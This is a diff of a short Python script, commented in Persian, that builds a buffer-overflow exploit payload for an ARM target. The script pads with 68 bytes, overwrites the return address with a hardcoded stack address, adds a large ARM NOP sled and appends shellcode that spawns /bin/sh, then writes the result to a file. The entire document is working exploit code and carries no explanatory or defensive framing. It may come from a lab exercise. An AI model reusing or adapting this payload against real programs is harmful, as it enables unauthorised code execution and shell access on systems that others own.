@@ -1,6 +1,7 @@
 import struct
 
-buf_addr = 0xbefff270
+offset = 68
+buf = 0xb6fb4198 + 100  # 100 بایت بعد از بافر
 
 shellcode = (
     b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40"
@@ -8,14 +9,12 @@ shellcode = (
     b"\x2f\x73\x68\x00"
 )
 
-offset = 75
+nop = b"\x00\x00\xa0\xe1"  # mov r0, r0
 
-target_addr = buf_addr + offset + 50  
+payload = b"A" * offset
+payload += struct.pack("<I", buf + 50)  # وسط NOP sled
+payload += nop * 100  # NOP sled بزرگ
+payload += shellcode
 
-payload = b"A" * offset           
-payload += struct.pack("<I", target_addr)
-payload += b"\x90" * 40      
-payload += shellcode               
-
-with open("final_exploit", "wb") as f:
+with open("big_nop.bin", "wb") as f:
     f.write(payload)
